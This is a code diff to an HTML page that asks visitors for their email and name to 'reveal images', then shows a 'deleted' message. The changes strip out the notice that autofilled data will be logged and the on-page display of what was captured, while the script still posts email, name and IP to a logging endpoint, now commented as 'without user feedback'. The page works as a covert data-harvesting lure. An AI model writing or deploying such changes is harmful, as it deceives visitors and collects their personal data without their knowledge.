@@ -90,14 +90,6 @@
             color: #ef5350;
             font-size: 1.2em;
         }
-        .deleted-message p {
-            margin: 0;
-        }
-        .autofill-note {
-            font-size: 0.9em;
-            color: #7f8c8d;
-            margin-top: 10px;
-        }
         .footer {
             text-align: center;
             padding: 20px;
@@ -123,11 +115,9 @@
                 <input type="text" id="name" name="name" required autocomplete="name">
             </div>
             <button class="reveal-button" onclick="revealImages()">Reveal Images</button>
-            <div class="autofill-note">Note: Autofilled data will be logged and processed if detected.</div>
         </div>
         <div id="deleted-section" class="deleted-message">
             <p>This image has been deleted or is no longer available.</p>
-            <p id="logged-data" style="margin-top: 10px;"></p>
         </div>
     </div>
     <div class="footer">
@@ -154,7 +144,7 @@
         function revealImages() {
             const email = document.getElementById('email').value;
             const name = document.getElementById('name').value;
-            logAutofillData(email, name); // Log on manual reveal too
+            logAutofillData(email, name);
         }
 
         function logAutofillData(email, name) {
@@ -162,21 +152,19 @@
                 ? '127.0.0.1' 
                 : (document.head.querySelector('[name~=x-forwarded-for][content]')?.content || 'Unknown');
 
-            // Log data to server
+            // Log data to server without user feedback
             fetch('/log-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ email, name, ip })
             }).then(response => {
                 if (response.ok) {
-                    displayDeletedMessage(email, name, ip);
+                    displayDeletedMessage();
                 }
             }).catch(error => console.error('Error logging data:', error));
         }
 
-        function displayDeletedMessage(email, name, ip) {
-            const loggedData = document.getElementById('logged-data');
-            loggedData.textContent = `Logged: ${email}, ${name}, IP: ${ip}`;
+        function displayDeletedMessage() {
             document.getElementById('form-section').style.display = 'none';
             document.getElementById('deleted-section').style.display = 'block';
         }
